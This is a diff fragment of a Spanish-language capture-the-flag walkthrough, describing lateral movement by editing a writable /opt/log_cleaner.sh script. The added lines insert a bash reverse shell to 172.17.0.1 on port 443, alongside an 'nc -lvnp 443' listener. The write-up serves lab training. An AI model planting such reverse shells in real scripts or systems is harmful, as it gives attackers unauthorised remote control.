@@ -53,3 +53,8 @@ Lo intento con el usuario Pedro con ```ssh pedro@172.17.0.2```  y accedemos al u
 No podemos correr ```sudo -l``` y tampoco hay binarios SUID vulnerables, por lo que podemos empezar a buscar archivos vulnerables.
 En el directorio /opt hay un archivo llamado ```log_cleaner.sh``` de grupo valentina y usuario valentina y tenemos permisos para leerlo, ejecutarlo y editarlo, por lo que lo configuramos para que nos haga una reverse shell.
 En una terminal ejecutamos ```nc -lvnp 443``` y en el usuario de pedro, configuraremos el archivo con ```nano``` de esta manera:
+```
+#!/bin/bash
+bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
+```
+
